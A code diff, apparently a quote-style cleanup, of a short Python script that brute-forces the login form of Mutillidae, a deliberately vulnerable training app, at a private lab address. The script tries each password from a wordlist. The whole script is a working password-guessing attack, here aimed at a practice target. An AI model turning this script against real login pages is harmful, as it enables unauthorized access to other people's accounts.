@@ -1,7 +1,7 @@
 import requests
 import sys
 
-url = 'http://192.168.198.128/mutillidae/index.php?page=login.php'
+url = "http://192.168.198.128/mutillidae/index.php?page=login.php"
 # headers = {
 #     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 #     'Accept-Language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
@@ -16,24 +16,23 @@ url = 'http://192.168.198.128/mutillidae/index.php?page=login.php'
 # }
 
 
-
 username = sys.argv[1]
 passlist = sys.argv[2]
 
 
-with open(passlist, 'r') as file:
+with open(passlist, "r") as file:
     for line in file:
         password = line[:-1]
 
         data = {
-            'username': username,
-            'password': password,
-            'login-php-submit-button': 'Login'
+            "username": username,
+            "password": password,
+            "login-php-submit-button": "Login",
         }
 
         response = requests.post(url, data=data, verify=False)
         # open("temp.html", "w+").write(response.text)
-        if 'Password incorrect' in response.text:
+        if "Password incorrect" in response.text:
             print(password, "... FAILED", flush=True)
         else:
             print(password, "... OK", flush=True)
